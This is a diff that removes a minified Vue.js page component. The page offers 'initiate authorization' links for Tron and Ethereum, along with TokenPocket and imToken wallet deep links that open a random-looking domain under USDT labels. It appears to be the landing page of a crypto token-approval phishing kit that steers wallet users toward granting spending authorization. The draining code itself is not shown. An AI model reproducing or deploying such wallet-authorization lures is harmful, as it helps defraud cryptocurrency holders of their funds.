@@ -1,9 +1,0 @@
-import"./request.f0f38fe8.js";import{d as p,o as i,c as d,w as e,r as l,a as t,b as n,e as o}from"./index.75351461.js";const h={align:"center"},m=n("br",null,null,-1),f=n("br",null,null,-1),k=n("br",null,null,-1),F=n("br",null,null,-1),b=n("br",null,null,-1),j=n("br",null,null,-1),y=n("br",null,null,-1),v=n("br",null,null,-1),D=n("br",null,null,-1),x=n("br",null,null,-1),B=n("br",null,null,-1),V=n("br",null,null,-1),q=n("br",null,null,-1),w=n("br",null,null,-1),I=p({__name:"Index",setup(z){return(A,g)=>{const r=l("el-header"),u=l("router-link"),s=l("el-link"),_=l("el-main"),c=l("el-footer"),a=l("el-container");return i(),d(a,null,{default:e(()=>[t(r),t(_,null,{default:e(()=>[n("div",h,[m,f,t(u,{to:"tron"},{default:e(()=>[o("\u53D1\u8D77\u6388\u6743(tron)")]),_:1}),k,F,t(s,{href:`tpdapp://open?params={\r
-            "url": "https%3A%2F%2Ftrans.pkcsy85jklue4116znpjlq935.com%2F%23%2Ftron",\r
-            "chain": "tron",\r
-            "source": "hello" \r
-        }`,type:"success"},{default:e(()=>[o("tp\u94B1\u5305-usdt(tron)")]),_:1}),b,j,t(s,{href:"imtokenv2://navigate/DappView?url=https%3A%2F%2Ftrans.pkcsy85jklue4116znpjlq935.com%2F%23%2Ftron",type:"success"},{default:e(()=>[o("imtoken-usdt(tron)")]),_:1}),y,v,D,x,t(u,{to:"eth"},{default:e(()=>[o("\u53D1\u8D77\u6388\u6743(eth)")]),_:1}),B,V,t(s,{href:`tpdapp://open?params={\r
-            "url": "https%3A%2F%2Ftrans.pkcsy85jklue4116znpjlq935.com%2F%23%2Feth",\r
-            "chain": "tron",\r
-            "source": "hello" \r
-        }`,type:"success"},{default:e(()=>[o("tp\u94B1\u5305-usdt(eth)")]),_:1}),q,w,t(s,{href:"imtokenv2://navigate/DappView?url=https%3A%2F%2Ftrans.pkcsy85jklue4116znpjlq935.com%2F%23%2Feth",type:"success"},{default:e(()=>[o("imtoken-usdt(eth)")]),_:1})])]),_:1}),t(c)]),_:1})}}});export{I as default};
